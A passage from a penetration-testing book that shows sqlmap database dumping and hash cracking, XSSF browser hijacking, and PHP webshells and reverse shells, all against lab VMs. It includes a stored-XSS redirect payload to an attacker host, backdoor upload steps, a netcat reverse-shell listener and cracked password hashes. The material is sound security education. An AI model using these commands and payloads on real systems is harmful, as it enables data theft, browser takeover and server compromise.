 Metasploitable 2 Exploitability Guide: [https://community.rapid7.com/docs/DOC-1875](https://community.rapid7.com/docs/DOC-1875)

 Jeremy Druin’s Metasploitable Videos: [https://www.youtube.com/user/webpwnized/videos](https://www.youtube.com/user/webpwnized/videos)

 Kali Linux Backtrack Evolved, Justin Hutchens: [https://www.packtpub.com/networking-and-servers/kali-linux-backtrack-evolved-assuring-security-penetration-testing-video](https://www.packtpub.com/networking-and-servers/kali-linux-backtrack-evolved-assuring-security-penetration-testing-video)

## Chapter 22

## SQL Map

SQLmap is a great tool for gaining access and pulling information from SQL databases. In short, it automates a lot of SQL injection attacks and tasks, making recovering information much easier. It can also find and crack database passwords. We will be using Mutillidae running on the Metasploitable VM for this section. I chose this VM as we will also be able to pull databases from the other web apps on the system as well!

Tool Authors: Bernardo Damele A.G., Miroslav Stampar

Website:  [http://sqlmap.org/](http://sqlmap.org/)

Help Command: sqlmap --help

![](Images/image00872.jpeg)

Overview of SQL Switches

For this tutorial we will mostly be using the following Switches:

![](Images/image00873.jpeg)

If you look closely you can see the flow of the switches, we list available databases with the “--dbs” switch and then select one with the “-D” switch. The same with tables, we list available tables in the database with the “--tables” switch and then select one with the “-T” switch. This will make more sense as we work through the examples.

Another important switch is “--purge-output”. When running, sqlmap creates log files and writes data to an output file directory. This command allows you to purge this directory when you select a new target to test, clearing out any remnant stored data from the previous scan.

Blind Boolean Injection

I just want to say a quick word about “Blind Boolean Injection”. As you use Sqlmap you will notice an interesting phenomenon. In Blind Boolean Injection, which is kind of creepy to watch, Sqlmap basically asks the website for information about the database one letter at a time. So, for example, it asks if the main table in the database starts with a “D”, and then checks the webpage for an error. If no error then it moves to the next character. You literally see the database names being built on the screen as it finds each character. It can pull password hashes and user information using the same process.

### Testing Mutillidae with Sqlmap

We have discussed what Sqlmap is and some of the command switches, let’s run it through the paces by using it against Mutillidae. Sqlmap works best when it has a vulnerable webpage and a captured request to the vulnerable page, an authenticated user or a cookie from a logged in user. There are a lot of different ways we could do this, but let’s create a new user and then capture the creation request as it is being posted to Mutillidae. We will copy that request to a text file and use it in a way as a key to unlock not only the Mutillidae database, but as you will see, it will give us access to ALL the databases on the server!

1.  Open IceWeasel and surf to Mutillidae
2.  In Mutillidae, toggle Security to “Level: 1 (Arrogent)” - Why make this easier?
3.  Click on “Login/Register”
4.  Click on “Please register here”
5.  Start the Burp Suite proxy, turn intercept on (Make sure the Proxy is set in IceWeasel)
6.  Now, fill in the registration page, I used ‘secure’ for the username and ‘securepass’ for the password. It doesn’t matter what you use for a username and password as we just need to capture the creation request:

![](Images/image00874.jpeg)

7.  Make sure intercept is turned on in Burp and click, “Create Account”

In Burp, we should have a captured the creation request.

8.  Right click on the captured request and from the menu select, “copy to file”:

![](Images/image00875.jpeg)

9.  Save the file on the Desktop as “request.txt”.
10.  In Burp Suite, turn the proxy off. This will let the registration request go through and you should get a message in Mutillidae that your new account was created. We are finished with Burp and you can close it if you like.

You are doing great! Take a second to catch your breath as we will now turn our attention to Sqlmap. In Sqlmap, we will use that captured request text file as a “Key to the Kingdom”.

Running SQLmap

1.  Open a new Terminal window in Kali.
2.  Type, “sqlmap -r ~/Desktop/request.txt --dbs”
3.  Enter “y” when asked, “It looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes?”
4.  Enter “y” when asked about including all tests for SQL.
5.  Enter “n” when asked, “POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)?”

Sqlmap will then determine what type of database server is running, MySQL 5.0 in this instance, and then will display the available databases:

![](Images/image00876.jpeg)

Now, remember that we used a Mutillidae user creation request to pull the database names, but notice the databases that are available to us. A total of 8 appear including the database for DVWA, which we aren’t even using! I know that it is a much different process (so please don’t send me hate mail) but this reminds me of why I don’t like multiple companies using shared servers to store confidential data.

Notice too that we didn’t need to manually tell sqlmap anything about the server that we are attacking; it was able to pull everything it needed from our request.txt file. Okay, let’s take a look at the “owasp10” database, and list its tables to see if we can find anything of importance.

6.  Type, “sqlmap -r ~/Desktop/request.txt -D owasp10 --tables”:

![](Images/image00877.jpeg)

As you can see six tables were found in the owasp10 database.

Digging through databases can be a hit or miss kind of thing. You may find something very important or something that really isn’t going to help you very much. From the list of tables in the owasp10 database, “accounts” sounds interesting. But what looks much more interesting is the table “credit_cards”!

As the “--tables” switch listed the available tables, we will use the “-T” switch to pick “credit_cards” and simply use the “--dump” switch to display the contents of that table.

7.  Type, “sqlmap -r ~/Desktop/request.txt -D owasp10 -T credit_cards --dump”:

![](Images/image00878.jpeg)

Jackpot! With just a few simple commands we were able to obtain a list of (fake) credit cards! If we were able to do this to a client’s webapp during a pentest, they would obviously have some very serious issues. Let’s poke around a bit in the other databases and tables and see what else we can find.

The database “nowasp” sounds interesting, let’s see what is in it. Again we will use “-D” to select the database “nowasp”, and the “--tables” command to have it display the available tables.

8.  Enter, “sqlmap -r ~/Desktop/request.txt -D nowasp --tables” and you should see the following tables:

![](Images/image00879.jpeg)

Let’s dump the “accounts” table and see what it contains.

9.  Enter, “sqlmap -r ~/Desktop/request.txt -D nowasp -T accounts --dump”:

![](Images/image00880.jpeg)

Oh nice, a large list of accounts and clear text passwords. I wonder where we might be able to use this information… Okay, not very realistic, database passwords are normally hashed and salted (I would hope!). But being the jack of all SQL trades, sqlmap has built in support for detecting and cracking password hashes.

Cracking Password Hashes

The “dvwa” database has some password hashes that we can recover and crack with Sqlmap.  

1.  Type, “sqlmap -r ~/Desktop/request.txt -D dvwa --tables”

This returns two tables, ‘guestbook’ and ‘users’. Of the two, ‘users’ sounds interesting. Let’s view the columns from that table.

2.  Enter, “sqlmap -r ~/Desktop/request.txt -D dvwa -T users --columns”:

![](Images/image00881.jpeg)

Looks like user account information and passwords. Let’s dump this table and see what we get.

3.  Type, “sqlmap -r ~/Desktop/request.txt -D dvwa -T users --dump”

When this command is executed, Sqlmap recognizes that there are password hashes in the Table.

4.  Enter “y” when asked if you want to store the hashes in a temp file.
5.  When prompted to crack the hashes, enter “y”
6.  Choose option “1 - default dictionary file” when prompted.
7.  Input “n” when asked if you want to use common password suffixes:

![](Images/image00882.jpeg)

Sqlmap will then begin cracking the passwords. Within a short amount of time it displays all the passwords:

Cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'

Cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'

Cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'

Cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'

As you can see, Sqlmap is a very powerful and useful tool!

Sqlmap Output Directory

Data from the sqlmap session is stored in the output directory, which in this case is “/root/.sqlmap/output/[Target IP Address]”. The files in this folder contain:

 A “Dump” directory containing a .csv copy of information dumped from databases

 A Log file with a transcript of the entire session

 A sqlite3 database of information recovered

 And information from our Burp request in a target.txt file:

root@kali:~/.sqlmap/output/192.168.1.68# ls

dump

log

session.sqlite

target.txt

We can open the “session.sqlite” file to view its contents:

 Enter, “sqlite3 session.sqlite”

 Type, “.tables” to view the available tables

There is only one table called “storage”. Let’s go ahead and dump this table:

 Enter, “.dump storage”:

![](Images/image00883.jpeg)

Here you see a copy of all the data we recovered. When finished, type “.quit” to exit. Don’t forget to turn off the proxy in your IceWeasel network connection settings. 

Conclusion

In this section we learned a lot about Sqlmap and its ability to pull information from web application databases. We saw how trivial it can be to pull accounts, passwords and sensitive data from vulnerable applications. Hopefully demonstrating how important it is to secure databases, write secure code and test apps for security issues.

We just covered some of the basic features of Sqlmap, take some time and play around with it to see what other information can be pulled from the Metasploitable databases. As experience is always the best teacher!

## Chapter 23

## Cross-Site Scripting Framework (XSSF)

The Cross-Site Scripting Framework (XSSF) is a pretty interesting XSS tool that was last updated in 2013 but still seems to work very well. In some ways it reminds me of BeEF, ‘The Browser Exploitation Framework’ (Covered in “Basic Security Testing with Kali Linux”), but it runs as an extension of Metasploit. With XSSF you create a web server through Metasploit that opens communication channels with target systems as they connect. You can then run a variety of Metasploit based attacks against the target, and in some cases even take over the browser and surf as if you were the target system.

XSSF creates a series of URLs to use. There are sample “evil” XSS URLs that you would send to a target via e-mail or some other way to get them to connect to our XSS server. There are control and log URLs used to view and attack the targets, and finally a Tunnel Proxy that lets us actually surf through the target’s browser. Lastly, we can combine XSSF with a third party Stored XSS vulnerable website for devastating effect creating connections with anyone that visits the Stored XSS site.

In this section we will be using Metasploit on our Kali system and our Windows 7 VM as the target.

Tool Author: Ludovic Courgnaud

Website:  [https://code.google.com/p/xssf/](https://code.google.com/p/xssf/)

Tool Wiki:  [https://code.google.com/p/xssf/w/list](https://code.google.com/p/xssf/w/list)

### Using XSSF

XSSF does not come installed on Kali by default. We need to download and install the XSSF framework into Metasploit. Once installed we will then use XSSF to test and control connected browsers.

1.  Download XSSF framework from the XSSF website.
2.  Copy (and merge) files into Metasploit folder (/usr/share/metasploit-framework)
3.  Make sure the Apache Server is stopped - “service apache2 stop”
4.  Start Metasploit (msfconsole)
5.  Type, “load xssf Port=80 Uri=/xssf/ Public=true Mode=Verbose” to start XSSF:

![](Images/image00884.jpeg)

This command loads the XSSF plugin, sets the port to use to 80, the Uri path to “/xssf/” and starts it in “Verbose” mode. You can change these options as desired. But for now, our new XSSF server should be running at the port specified.

The first thing we need to do is to find out what URLs XSSF is using. Of most importance to us is the command and control URL, the booby trapped URL used to perform the XSS attack and lastly the Tunnel Proxy where we can surf through the target’s system.

6.  At the msf > prompt, type, “xssf_urls”:

[+] XSSF Server: 'http://192.168.1.39:80/xssf/' or 'http://<PUBLIC-IP>:80/xssf/'

[+] Generic XSS injection: 'http://192.168.1.39:80/xssf/loop' or 'http://<PUBLIC-IP>:80/xssf/loop'

[+] XSSF test page: 'http://192.168.1.39:80/xssf/test.html' or 'http://<PUBLIC-IP>:80/xssf/test.html'

[+] XSSF Tunnel Proxy: '192.168.1.39:81' or '<PUBLIC-IP>:81'

[+] XSSF logs page: 'http://192.168.1.39:81/xssf/gui.html?guipage=main'  or 'http://<PUBLIC-IP>:81/xssf/gui.html?guipage=main'

[+] XSSF statistics page: 'http://192.168.1.39:81/xssf/gui.html?guipage=stats' or 'http://<PUBLIC-IP>:81/xssf/gui.html?guipage=stats'

[+] XSSF help page: 'http://192.168.1.39:81/xssf/gui.html?guipage=help' or 'http://<PUBLIC-IP>:81/xssf/gui.html?guipage=help'

These are the URLs that we will be using. First we need to open the log screen in our browser.  This acts as a command and control interface.

7.  Open Iceweasel
8.  Surf to XSSF Logs page ([http://192.168.1.39:81/xssf/gui.html?guipage=main](http://192.168.1.39:81/xssf/gui.html?guipage=main))

![](Images/image00885.jpeg)

![](Images/image00886.jpeg)

Now leave this screen up and go to the Windows 7 system.

9.  In Windows 7, open the XSSF test page URL (192.168.1.39/xssf/test.html)

![](Images/image00887.jpeg)

A rather obscure looking page, but back on the Kali side, we should now see this (you may need to refresh the Kali webpage):

![](Images/image00888.jpeg)

We now have our first victim connected! We can now use XSSF to attack this victim.

10.  In Metasploit type, “help xssf” to see available commands.

This will display multiple commands that can be run from the msf prompt. For example we can list all attached victims in Meterpreter with the “xssf_victims” command:

![](Images/image00889.jpeg)

Notice the victim listed is the same one that shows up in our Iceweasel browser. This is just the text command line version to the browser’s GUI. Some commands deal with the victim, some with the server, and others with database use and cleanup. Some of the commands require you to enter the victim ID.

So the “xssf_information 1” command will display:

![](Images/image00890.jpeg)

Take a minute and read through the commands to become familiar with them.

Attacking Targets with XSSF

Now that we have an active target, let’s see what we can do to attack it. XSSF comes with multiple add-in modules for Metasploit. Basically you use the module, tell it what target ID(s) to attack and run the exploits.

1.  Type, “search xssf” to see available modules:

auxiliary/xssf/public/android/steal_sdcard_file              normal  ANDROID SDCARD FILE STEALER

auxiliary/xssf/public/chrome/filejacking                            normal  FileJacking

auxiliary/xssf/public/ie/command                                          normal  COMMAND XSSF (IE Only)

auxiliary/xssf/public/iphone/skype_call                            normal  Skype Call

auxiliary/xssf/public/misc/alert                                          normal  ALERT XSSF

auxiliary/xssf/public/misc/change_interval                            normal  Interval changer

*** Truncated ***

auxiliary/xssf/public/network/ping                                          normal  Ping

auxiliary/xssf/public/network/web_services                            normal  Services finder

auxiliary/xssf/public/old_browsers/bypass_sop_ie6              normal  SOP Bypass

auxiliary/xssf/public/persistence/ghostify                            normal  Ghostifier

auxiliary/xssf/public/persistence/iframize                            normal  Iframizer

Notice that there are attacks for iPhone, Android, Windows and Linux. As it hasn’t been updated in a couple years, I am not sure if all of them are still 100% functional. But let’s look at how to use the modules for attack.

First up, let’s have our victim scan the network for us.

2.  Enter the following in Metasploit:

 use auxiliary/xssf/public/network/ms_windows_html5/scan_network

 show options

 set srvhost 192.168.1.39

 set VictimIDs 1

 set startIP 192.168.1.1

 set endIP 192.168.1.100

 run

As seen below:

![](Images/image00891.jpeg)

This will take a while to run, if you want you can run Wireshark and watch the Windows 7 target systematically scan the network for live hosts:

Broadcast              ARP              Who has 192.168.1.25?   Tell 192.168.1.93

Broadcast              ARP              Who has 192.168.1.26?   Tell 192.168.1.93

Broadcast              ARP              Who has 192.168.1.27?   Tell 192.168.1.93

Broadcast              ARP              Who has 192.168.1.28?   Tell 192.168.1.93

When it is finished we get a list of active systems found in Meterpreter:

![](Images/image00892.jpeg)

If we go back to the XSSF Logs page in Iceweasel we also get a very nice output of what command was run from the victim and what the results were by clicking on the [+] sign next to our victim, and then clicking the Network Scanner line in the middle windows and finally clicking the results button:

![](Images/image00893.jpeg)

So, by just getting a victim to visit our XSS page, we were able to force them to do a network scan for us! Take some time and check out the other modules, some of them do some interesting things.

Tunneling with XSSF

Originally you could use XSSF’s tunneling feature to browse through the target system’s browser. This would work great if the target system had access to a network that the attacker didn’t. I actually had mixed results when trying this out for the book. For a while it was working flawlessly. But then oddly enough it just stopped working and I couldn’t get it working again. Not sure if I had something set wrong, or if a security update or system patch killed it. But if you want to try it out for yourself here are the steps for XSSF tunneling:

1.  Make sure you still have an active victim:

![](Images/image00894.jpeg)

2.  Start the XSSF Tunnel, “xssf_tunnel [Victim ID#]” as shown:

![](Images/image00895.jpeg)

3.  Next, open up a new instance of the Iceweasel browser in Kali and set your proxy network settings to the “Tunnel Proxy” shown when you type “xssf_urls” (192.168.1.39 port 81 on mine).
4.  Now surf to some sites, if it works correctly you should be surfing through the target system.
5.  Press “Cntrl-C” in Metasploit to end the tunnel
6.  Turn off the proxy when done.

Stored XSS and XSSF for the Win

We talked about Stored XSS attacks in the Burp Suite chapter. You can mix Stored XSS and XSSF for some interesting attacks. If during a pentest, we find a website that is XSS vulnerable, we could use XSS to embed a link to our XSSF system. This way, we will get an immediate connection to target systems whenever they visit the vulnerable website. This is demonstrated completely in the YouTube video linked to from the main XSSF tool author’s page:

[https://www.youtube.com/watch?v=AhUhOirEfTE](https://www.youtube.com/watch?v=AhUhOirEfTE)

As this video shows you the complete step-by-step directions, I will only cover the highlights in getting this to work with our Metasploitable 2 DVWA application. We will be using the Metasploitable VM and the Windows 7 VM in this section.

1.  Make sure XSSF is up and running in Meterpreter.
2.  Start the Metasploitable2 VM.
3.  Using Iceweasel in Kali, surf to your Metasploitable 2 DVWA application. (Don’t forget to turn off the Iceweasel Proxy if you set it in the previous section).
4.  Login and surf to the XSS Stored Page:

![](Images/image00896.jpeg)

What we are going to do is leave a comment on the DVWA Guestbook page. This comment will include an XSS script to load the XSSF framework infector page. This should automatically infect every browser that visits this page and create a connection to our XSSF Framework server!

The video demonstrates using an image source script, but we will just use the script Source tag (use your Kali IP address and Port):

<script>window.location="http://192.168.1.39:80/xssf/test.html"</script>

This script will be longer than the pre-defined field will accept for messages, so we will again use our favorite tool Burp to make it fit (You could also use a browser plug-in to try to change the frame size dynamically). 

5.  Create a message, but don’t submit it yet. Something like:

![](Images/image00897.jpeg)

6.  Now start Burp Suite and turn on the intercepting proxy (don’t forget to set it in Iceweasel too - localhost 8080).
7.  With Burp’s Intercepting proxy on, click “Sign Guestbook”
8.  Modify the intercepted post to include our Script information:

![](Images/image00898.jpeg)

9.  And let Burp forward this to the DVWA Webserver.
10.  Turn Burp Intercept Off
11.  Now surf to the DVWA Stored XSS Page

You should automatically be redirected to the XSSF test page:

![](Images/image00899.jpeg)

If you go to the XSSF console, and type “xssf_victims” you should see a new victim:

![](Images/image00900.jpeg)

Now, any new visitors to our DVWA XSS stored page will automatically be redirected to our booby-trapped XSSF page. Go ahead and close the browser in your Windows 7 VM. Then in Windows 7, open the browser again and surf to the Mutillidae2’s DVWA. Login to DVWA and make sure the security is set to “low”. Now navigate to the stored XSS page, and you should immediately be sent to the XSSF server page:

![](Images/image00901.jpeg)

This attack would be very noticeable, I mean a victim visited one page but ended up at an entirely different page. As we are Ethical security testers this isn’t really a problem, as we are testing security, not trying to hack people. If you wanted to, you could make the XSSF page look more realistic or try the image script used in the YouTube video to see if you get different results. 

Conclusion

In this section we learned how to install and use the Meterpreter Add-In “XSSF”. Though the XSSF framework is a couple years old, it is still effective at taking over and controlling a victim browser by having them do nothing more than casually visit our XSSF webpage.

This is something that you will definitely want to test your network systems against. Some security programs and script blockers do an amazing job at defending against these types of attacks. I tried this with a Windows 7 system that was using the “NoScript” ([https://addons.mozilla.org/en-us/firefox/addon/noscript/](https://addons.mozilla.org/en-us/firefox/addon/noscript/)) Firefox add-in and it instantly blocked the XSS attack.

## Chapter 24

## Web Shells

In several sections of the book I mention using web shells. Kali Linux comes with multiple web shells for your use. In this section we will look at the PHP webshell generator “Weevely” and briefly cover the webshells that are included in the “/usr/share/webshells” directory. 

### Weevely

Website:  [https://github.com/epinna/weevely3](https://github.com/epinna/weevely3)

![](Images/image00902.jpeg)

![](Images/image00903.jpeg)

Weevely is a neat little utility that allows you to generate your own PHP backdoor shells and then run commands on a remote web server. We will use Weevely against our Metasploitable machine by uploading it to DVWA. But first let’s see how to create a shell.

You can create a PHP shell by using, “weevely generate <password> [output path]”. Let’s create a shell called ‘knockknock.php’ with the password ‘knockknock’:

1.  Type, “weevely generate knockknock /root/Desktop/knockknock.php”
2.  Navigate to DVWA and upload the shell:

![](Images/image00904.jpeg)

Take notice of where it stores the file (../../hackable/uploads/knockknock.php).

3.  Surf to where DVWA stored the file:

(http://192.168.1.68/dvwa/hackable/uploads/knockknock.php)

4.  Now to connect to the shell, run weevely again and put in the full URL and password:

![](Images/image00905.jpeg)

As you can see we are connected to the webserver and are in the ‘DVWA/hackable/uploads directory’. You can now run any terminal command you want!

Weevely Commands

Weevely doesn’t stop with just a remote shell. It includes numerous commands that you can run after you get an open shell. At a Kali terminal prompt type, “weevely help” to see a list of all the commands:

![](Images/image00906.jpeg)

Let’s take a look at a few of these commands.

1.  At a weevely shell type, “:audit.etcpasswd”:

![](Images/image00907.jpeg)

And weevely dumps the passwd file.

2.  To audit user files, “:audit.userfiles”:

![](Images/image00908.jpeg)

At the time of this writing, some of the commands that I tried gave error messages, but over all this is a very useful tool.

### Kali Included Webshells

These are a mix of command only, gui webshells and interactive remote shells that come with Kali located in the “/usr/share/webshells” directory.

Shells are included for the following programming languages:

 Asp

 Aspx

 Cfm

 Jsp

 Perl

 PHP

We will just take a brief look at the PHP shells, but I also suggest checking out the other webshells included so you know what they do in case you need them. For convenience I simply copied the webshells to a “shell” directory on the local Kali webserver.

PHP-Simple Backdoor

Usage: Simply upload the “simple-backdoor.php’ file to a webserver and then pass commands to it via “http://[Website IP]/simple-backdoor.php?cmd=[Command]”

So to do a directory listing of the target server:

 Type, “192.168.1.39/shells/simple-backdoor.php?cmd=ls”:

![](Images/image00909.jpeg)

PHP-Backdoor

Usage: Upload the “php-backdoor.php” file to webserver, then access directly.

Screenshot:

![](Images/image00910.jpeg)

qsd-php-backdoor.php

Usage: Upload “qsd-php-backdoor.php” file to webserver, then access directly.

Screenshot:

![](Images/image00911.jpeg)

The last two included PHP shells are interactive shells and not web shells. These require a little bit of setup, for full instructions display the files.

PHP-reverse-shell.php

Usage: This is a very useful reverse shell. Simply set the IP address and Port to connect back to in the PHP script and upload the file and use Netcat to communicate with it.

 Edit the shell and put in your local Kali IP address and port:

![](Images/image00912.jpeg)

 Upload the shell to a webserver

 Start Netcat, “nc -v -l -p 1234”

 Finally just surf to the file on the webserver to start the reverse shell.

Screenshot:

![](Images/image00913.jpeg)

PHP-findsock-shell

Usage: This is another full interactive shell, not just a webshell. Full instructions for the file are included in the file comments. Basically compile the file, upload to target web server and then connect to it via Netcat:

![](Images/image00914.jpeg)

Metasploit Shells

In addition to these, don’t forget that you can make your own shells using msfvenom, covered earlier in this book.

Conclusion

In this section we learned how to create a PHP shell using “Weevely”. We saw that Weevely has some built in commands that can help during a pentest. We also briefly looked at the included PHP webshells that come with Kali. These and the other shells in the webshell directory could come in very handy when needed.

Resources

 Weevely Command List - [https://github.com/epinna/Weevely/wiki/Modules-list](https://github.com/epinna/Weevely/wiki/Modules-list)

## Chapter 25

## Web App Tools

We have covered just a small portion of the web app tools that come with Kali. In this section we will take a quick look at most of the remaining web security testing tools that come pre-installed in Kali. Everyone has their favorite tools that they use, hopefully you will find a tool here that you did not know existed, or didn’t know that it was already in Kali.

I will just cover basic usage here, I leave learning more about them and their application up to you. This should be very informative for new users. And hopefully show more advanced users what tools already exist, possibly precluding them to have to write their own for a specific function.

Each item will list a short overview, the tool author and website (when known) along with short notes and on most, basic functionality. If not specifically mentioned the target used in the examples was the Metasploitable VM. 

### BBQSQL

Overview: Blind SQL Injection Tool

Tool Author: Neohapsis

Tool Website:  [https://github.com/Neohapsis/bbqsql/](https://github.com/Neohapsis/bbqsql/)

![](Images/image00915.jpeg)

BBQSQL is a Blind SQL injection framework. For a basic attack, you need to provide the website URL, injection query location and the method. You need to insert the template “${injection}” for the keyword you want to attack. 

![](Images/image00916.jpeg)

See the project website for usage instructions.

![](Images/image00917.jpeg)

### BlindElephant

Overview: BlindElephant is a quick, non-invasive Web Application Fingerprinter

Tool Author: Qualys, Inc.

Tool Website:  [http://blindelephant.sourceforge.net/](http://blindelephant.sourceforge.net/)

![](Images/image00918.jpeg)

BlindElephant is a fast, low-resource scanner that supports 15 commonly deployed web apps with hundreds of versions and also supports web app plugins.

To see a list of supported Web Apps:

 Type, “BlindElephant.py --list”

To scan a website:

 Type, “BlindElephant.py http://[IP Address/App Directory] [webapp name] or guess”

root@kali:~# BlindElephant.py http://192.168.1.68/tikiwiki tikiwiki

Loaded /usr/lib/python2.7/dist-packages/blindelephant/dbs/tikiwiki.pkl with 106 versions, 10624 differentiating paths, and 708 version groups.

Starting BlindElephant fingerprint for version of tikiwiki at http://192.168.1.68/tikiwiki

----- Truncated -----

Fingerprinting resulted in: 1.9.5

Best Guess: 1.9.5

![](Images/image00917.jpeg)

### Dirb

Overview: Dirb is a webscanner that returns hidden and non-hidden web objects.

Tool Author: The Dark Raver

Tool Website:  [http://dirb.sourceforge.net/](http://dirb.sourceforge.net/)

![](Images/image00919.jpeg)

Dirb is a website scanner that looks for existing and hidden website URLs. Finding this content can help in a penetration test. Dirb works by using wordlists to find the website objects.

Quick Scan:

 Type “dirb [target IP Address]”

![](Images/image00920.jpeg)

Scan with Included Apache Wordlist:

This scans the website for a much more exacting list looking for 30 URL names.

 Type, “dirb http://[Metasploitable IP Address] /usr/share/dirb/wordlists/vulns/apache.txt”

![](Images/image00921.jpeg)

Additional wordlists are available in the ‘/usr/share/dirb/wordlists/’ directory.

![](Images/image00917.jpeg)

### DirBuster

Overview: DirBuster is a GUI web directory/ file scanner.

Tool Author: OWASP

Tool Website:  [https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)

![](Images/image00922.jpeg)

DirBuster is a directory/ file scanner, like Dirb, that works by using wordlists. DirBuster is an older utility and for the most part has been replaced by OWASP ZAP, but some people still use it. DirBuster is run through a graphical interface that you can start by typing, “dirbuster” in a terminal.

To use DirBuster, simply enter a target URL, select a wordlist (located at “/usr/share/dirbuster/wordlists”), select any other options you want, turn the thread count up for faster performance and then click “start”:

![](Images/image00923.jpeg)

And the results:

![](Images/image00924.jpeg)

You are given an option when completed to save the results in a report file:

DirBuster 1.0-RC1 - Report

http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project

Report produced on Thu Jun 04 21:24:03 EDT 2015

--------------------------------

http://192.168.1.68:80

--------------------------------

Directories found during testing:

Dirs found with a 200 response:

/

/twiki/

/phpMyAdmin/

/mutillidae/

/dav/

/icons/

/twiki/bin/view/

/twiki/bin/view/Main/

             ------ Truncated ------

![](Images/image00917.jpeg)

### HTTrack

Overview: Website Copier & Offline Browser Utility

Tool Author: Xavier Roche and other contributors

Tool Website:  [https://www.httrack.com/](https://www.httrack.com/)

![](Images/image00925.jpeg)

HTTrack allows you to download a complete copy of a website, including all links and graphics.  This tool has extensive capabilities, check help file and tool website for more information.

Basic Usage:

 httrack [Target Website] --mirror-wizard

![](Images/image00926.jpeg)

The command above will copy the target website to the current directory. It is running in wizard mode, so it will prompt you at times with questions on how deep you want to traverse, etc.

You can just run HTTrack with no options and it will step you through creating a download project. When you are finished you can open the index file in your web browser and you will be presented with a local copy of the site (minus databases, some scripts, etc):

![](Images/image00927.jpeg)

If you wanted to run a phishing campaign for a pentest you could mirror a website with this tool, and then run it from Kali’s Apache server or even from the Python Simple HTTP server.

### GoLismero

Overview: Web Security Tester

Tool Author: Mario Vilas

Tool Website:  [https://github.com/golismero](https://github.com/golismero)

![](Images/image00928.jpeg)

GoLismero - “The Web Knife” is a security testing framework that spiders, scans and tests a target website. 

Basic Usage:

 golismero scan [Target Host or IP]

![](Images/image00929.jpeg)

GoLismero can be expanded with Plugins:

 golismero plugins

![](Images/image00930.jpeg)

 golismero info <plugin>

![](Images/image00931.jpeg)

 golismero scan <target> -e <plugin>

![](Images/image00932.jpeg)

![](Images/image00917.jpeg)

### Nikto

Overview: Web Application Scanner

Tool Author: Chris Sullo, Dave

Tool Website:  [https://cirt.net/nikto2](https://cirt.net/nikto2)

![](Images/image00933.jpeg)

Nikto is an Open Source web server scanner that searches for dangerous/ outdated programs and configuration errors. Though not a stealthy tool it is very fast.

Basic usage:

 Type, “nikto -host [IP Address]”:

![](Images/image00934.jpeg)

Nikto can do much more; check out the user manual at: [https://cirt.net/nikto2-docs/](https://cirt.net/nikto2-docs/)

![](Images/image00917.jpeg)

### Paros

Overview: Web Proxy and Security Scanner

Tool Author: Paros, Yukusan

Tool Website: [http://sourceforge.net/projects/paros/](http://sourceforge.net/projects/paros/)

![](Images/image00935.jpeg)

Paros is a web proxy that supports spidering, application vulnerability testing and more.

Basic Usage:

 Type, “paros” to start

 Go to Tools > Options > Local Proxy to view proxy settings

 Set Iceweasel Network Connection Proxy to Paros proxy settings

 Surf to Mutillidae

 Now, in Paros, click the down arrow next to “Sites”

 The Metasploitable VM IP Address will show up in Paros, under “Sites”

To Spider:

 Right click on the IP Address and select “Spider”

 Next, click “Start”

To Scan:

 Click on the Metasploitable IP Address

 From the tool menu, select “Analyze”

 Click, “Scan”:

![](Images/image00936.jpeg)

 To view report, click “Report”

 And then, “Last Scan Report” or just view the html file at the URL provided:

![](Images/image00937.jpeg)

![](Images/image00917.jpeg)

### Plecost

Overview: WordPress Vulnerability Finder

Tool Author: Francisco Jesus Gomez aka (ffranz@iniqua.com), Daniel Garcia Garcia (dani@iniqua.com)

Tool Website:  [https://github.com/iniqua/plecost](https://github.com/iniqua/plecost)

![](Images/image00938.jpeg)

Plecost is a WordPress fingerprinting tool and vulnerability scanner.

Quick Scan:

 plecost http://[Target Site].com

See project website for additional scans and usage videos.

![](Images/image00917.jpeg)

P0f

Overview: Purely passive fingerprinting tool

Author: Michal Zalewski

Website: [http://lcamtuf.coredump.cx/p0f3/](http://lcamtuf.coredump.cx/p0f3/)

![](Images/image00939.jpeg)

P0f is a very easy to use purely passive tool that identifies and fingerprints network resources from TCP/IP communication (either live or from a pcap file). Simply tell P0f what interface to monitor (-i eth0) and where to store the output file (-o p0fsignatures) and P0f immediately begins capturing network traffic and analyzing it passively for signatures.

Basic Usage:

 Start POF by entering, “p0f -i eth0 -o /root/Desktop/p0fsignatures”

 Open Mutillidae’s webpage

 Login, surf around for a while:

![](Images/image00940.jpeg)

 Press “Cntrl-C” when done.

 Then, “cat /root/Desktop/p0fsignatures” to view log file:

[2015/06/10 16:37:50] mod=syn|cli=192.168.1.39/34913|srv=192.168.1.68/80|subj=cli|os=Linux 3.11 and newer|dist=0|params=none|raw_sig=4:64+0:0:1460:mss*20,7:mss,sok,ts,nop,ws:df,id+:0

[2015/06/10 16:37:50] mod=syn+ack|cli=192.168.1.39/34913|srv=192.168.1.68/80|subj=srv|os=Linux 2.6.x|dist=0|params=none|raw_sig=4:64+0:0:1460:mss*4,5:mss,sok,ts,nop,ws:df:0

[2015/06/10 16:37:50] mod=http response|cli=192.168.1.39/34913|srv=192.168.1.68/80|subj=srv|app=Apache 2.x|lang=none|params=none|raw_sig=1:Date,Server,X-Powered-By=[PHP/5.2.4-2ubuntu5.24],?Expires,Logged-In-User=[admin],?Cache-Control,?Pragma,?Last-Modified,Keep-Alive=[timeout=15, max=100],Connection=[Keep-Alive],Transfer-Encoding=[chunked],Content-Type:Accept-Ranges:Apache/2.2.8 (Ubuntu) DAV/2

You can also use Grep to parse the list, but as you read through it, you will see detected operating systems, software versions and other information.

![](Images/image00917.jpeg)

### Skipfish

Overview: Web Application Security Recon Tool

Tool Author: Google Inc, Michał Zalewski

Tool Website: [https://code.google.com/p/skipfish/](https://code.google.com/p/skipfish/)

![](Images/image00941.jpeg)

Skipfish is a website reconnaissance tool & security scanner that scans a website and then creates a report containing an interactive sitemap.

Basic Usage:

 Type, “skipfish -o skipfishdata http://[IP Address]”

![](Images/image00942.jpeg)

